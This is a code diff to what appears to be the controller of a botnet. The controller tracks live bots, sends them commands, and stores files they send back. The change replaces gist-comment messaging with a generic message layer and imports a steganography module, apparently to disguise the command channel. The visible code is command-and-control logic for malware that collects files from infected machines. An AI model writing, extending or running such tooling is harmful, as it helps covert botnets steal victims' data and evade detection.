@@ -4,6 +4,7 @@ import datetime
 import utils
 from utils import Command
 import log
+import stegano
 
 SHOW_INFO = True
 LOGFILE = '.controllog'
@@ -13,7 +14,7 @@ LAST_COMMENT = 0
 ALIVE_BOTS = {}
 
 
-# TODO: better message
+# TODO: more helpful message
 def error(args):
     print("Bad input")
     print(args)
@@ -37,12 +38,12 @@ def send_heartbeat():
 
 def check_bots():
     global LAST_COMMENT, ALIVE_BOTS, BOT_TTL
-    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
+    messages, LAST_COMMENT = utils.get_fresh_messages(LAST_COMMENT)
 
     tick_bots()
 
-    for comment in data:
-        isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
+    for msg in messages:
+        isctrl, bot, cmd, d, r = utils.parse_message(msg)
         if isctrl: continue
         
         ALIVE_BOTS[bot] = BOT_TTL
@@ -72,29 +73,19 @@ def handle_response(bot, cmd, data):
 
 
 def send_command(bot, cmd, data, respond):
-    comment = construct_command(bot, cmd, data, respond)
-    response = utils.post_gist_comment(comment)
+    msg = utils.construct_message(True, bot, cmd, data, respond)
+    response = utils.send_message(msg)
     log.add_log_entry(SHOW_INFO, LOGFILE, log.Command(bot, cmd, data, respond))
     return response
 
 
 def save_file(bot, filepath, data):
     filename = filepath + '.' + str(bot) + '.' + str(datetime.datetime.now())
-    filedata = utils.base64_to_text(data)
+    filedata = stegano.base64_to_text(data)
 
     file = open(filename, 'w+')
     file.write(filedata)
     file.close()
-
-
-# TODO rework
-def construct_command(bot, cmd, data, respond):
-    return utils.DELIM \
-        + str(int(True)) + utils.DELIM \
-        + str(bot) + utils.DELIM \
-        + cmd.name + utils.DELIM \
-        + data + utils.DELIM \
-        + str(int(respond)) + utils.DELIM
 
 
 def main(args):
